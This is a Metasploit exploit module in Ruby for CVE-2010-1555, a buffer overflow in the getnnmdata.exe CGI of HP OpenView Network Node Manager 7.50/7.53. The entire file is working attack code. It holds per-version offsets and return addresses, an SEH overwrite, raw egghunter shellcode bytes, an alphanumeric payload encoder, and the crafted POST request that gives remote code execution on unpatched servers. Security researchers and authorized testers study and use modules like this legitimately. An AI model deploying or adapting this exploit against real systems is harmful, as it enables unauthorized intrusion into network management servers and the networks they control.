# $Id: hp_nnm_getnnmdata_hostname.rb 12131 2011-03-25 00:46:59Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    HttpFingerPrint = { :method => &#039;HEAD&#039;, :uri => &#039;/OvCgi/getnnmdata.exe&#039;, :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager getnnmdata.exe (Hostname) CGI Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.
                By sending specially crafted Hostname parameter to the getnnmdata.exe CGI,
                an attacker may be able to execute arbitrary code.
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12131 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1555&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 750,
                    &#039;BadChars&#039; => "\x00",
                    &#039;PrependEncoder&#039; => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
                    &#039;DisableNops&#039; => &#039;True&#039;,
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;ECX&#039;,
                        },
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;HP OpenView Network Node Manager 7.50&#039;, { &#039;Offset&#039; => 65640, &#039;Ret&#039; => 0x5a01f277 } ],
                    [ &#039;HP OpenView Network Node Manager 7.53&#039;, { &#039;Offset&#039; => 65640, &#039;Ret&#039; => 0x5a666d69 } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;May 11 2010&#039;))
 
        register_options( [ Opt::RPORT(80) ], self.class )
    end
 
    def exploit
 
        egg = rand_text_alpha_upper(4)
 
        hunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        hunter << "\xef\xb8" + egg + "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
        boom =  rand_text_alpha_upper(target[&#039;Offset&#039;])
        boom << generate_seh_record(target.ret)
        boom << hunter + egg + egg
        boom << payload.encoded
        boom << rand_text_alpha_upper(90024 - payload.encoded.length)
         
        sploit = "SnmpVals=&Hostname=#{boom}"
 
        print_status("Trying target #{target.name}...")
 
        send_request_cgi({
            &#039;uri&#039;       => &#039;/OvCgi/getnnmdata.exe&#039;,
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;data&#039;      => sploit
            }, 8)
         
        handler
 
    end
 
end



